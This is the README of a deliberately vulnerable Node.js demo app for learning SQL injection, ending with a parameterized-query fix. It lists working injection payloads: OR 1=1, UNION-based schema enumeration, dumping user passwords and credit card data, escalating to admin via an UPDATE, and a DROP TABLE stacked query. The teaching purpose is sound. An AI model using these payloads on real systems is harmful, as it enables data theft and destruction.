# Learning SQL Injection

## Description

This intentional bad written node.js app demonstrate how SQL injections can
happen and how they could be abused.

## WARNING - DISCLAIMER

THIS APP IS VULNERABLE AGAINST SQL INJECTION, ONLY EXECUTE THE APP FOR LEARNING
PURPOSES AND ONLY WITHIN A TRUSTED ENVIRONMENT AND ONLY WITH A DATABASE USER
WITH LIMITED ACCESS.

TO REDUCE THE RISK THE APP ONLY LISTENS TO CONNECTIONS FROM LOCALHOST.

USE THE APP AT YOUR OWN RISK!

## Setup

To prepare this demo you need to do the following:
 - execute `npm install` (this will install mysql and express)
 - import `example-database.sql` into an empty MySQL database
 - change `db.js` and enter you database config

To run the demo:
 - execute `npm start`
 - open http://localhost:3000

## The bad code

The /hw endpoint in the app.js builds the SQL query by simply concatenating
the the query template (`SELECT ... LIKE '%`) with the user's input for filtering
the result (`req.query.name`) and the end part of the SQL query (`%'`).

## What the developer wanted

The SQL query which is the sent to the database server should look like:

```
SELECT
name, stock, price
FROM product
WHERE name LIKE '%hammer%'
```

## Inject

The attacker wants to inject his own code.

He finds the vulnerability by searching for `Ham'mer`. The server returns an error.
And this is the good signal for the attacker.

The attacker doesn't know the SQL query, but it was:

```
SELECT
name, stock, price
FROM product
WHERE name LIKE '%Ham'mer%'
```

As you can see this is not a valid SQL query, hence the error.

Next step would be to make the SQL query valid again:
The attacker searches for `something' OR 1=1 -- comment` and the query becomes:

```
SELECT
name, stock, price
FROM product
WHERE name LIKE '%something' OR 1=1 -- comment%'
```

This will show all products even if they not have `something` in the name.

Then `-- comment` part ensures, that everything after the double hyphen is ignored
because it's a SQL comment.

## Be Creative

### Select other stuff

With the `UNION` keyword you can combine two queries into one result set.

Searching for `' UNION SELECT 'a' -- comment` will throw an error.
The attacker does not know the exact error, but he assumes it is the follwing:

`The used SELECT statements have a different number of columns`

To get the `UNION` keyword working the second SQL query (the attacker's one) must have
exactly the same number of columns as the internal one (which he doesn't know).

After trying a query with two columns (error) the following injection
returns the products again:

Search term: `' UNION SELECT 'a', 'b', 'c' -- comment`

Resulting query:

```
SELECT
name, stock, price
FROM product
WHERE name LIKE '%' UNION SELECT 'a', 'b', 'c' -- comment%'
```

This will show the product `a, b, c` in the result.

### Examples

`xyz' UNION SELECT 'a', 'b', 'c' -- comment`

`xyz' UNION SELECT TABLE_SCHEMA, TABLE_NAME, 'c' FROM information_schema.TABLES -- comment`

`xyz' UNION SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM information_schema.COLUMNS -- comment`

`xyz' UNION SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'sql_learning_injection' -- comment`

```xyz' UNION SELECT name, mail, `group` FROM user -- comment```

```xyz' UNION SELECT id, name, CONCAT_WS('<br/>', id, name, password, clear_pw, credit_card, mail, `group`) FROM user -- comment```

### Further ideas (not part of this learning)

#### When updating own user details inject sql to set group to admin

Bad query
`UPDATE user SET mail = '" + req.query.mail + "' WHERE id = " + user_id`

with user input
```my.mail@example.com ', `group` = 'admin```

becomes
```UPDATE user SET mail = 'my.mail@example.com ', `group` = 'admin' WHERE id = 42```

#### Execute multiple queries

Bad query
`SELECT name, stock, price FROM product WHERE name LIKE '%" + req.query.name + "%'`

with user input
`'; DROP TABLE USER -- --`

becomes
`SELECT name, stock, price FROM product WHERE name LIKE '%'; DROP TABLE USER -- --%'`


## The good code ... or: How to avoid them

Don't use user input directly.

Either escape the user input properly or better use prepared statements and bind the user input to parameters.

## Example

```
app.get('/hw', function (req, res) {
    const query = "SELECT name, stock, price FROM product WHERE name LIKE ?";
    const param = ['%' + req.query.name + '%'];
    conn.query(query, param, (err, rows) => {
       if (err) {
           res.status(500).send(err.toString());
       } else {
           res.status(200).json(rows);
       }
    });
});
```

Small code change, huge outcome!

Do it! Do it everywhere!
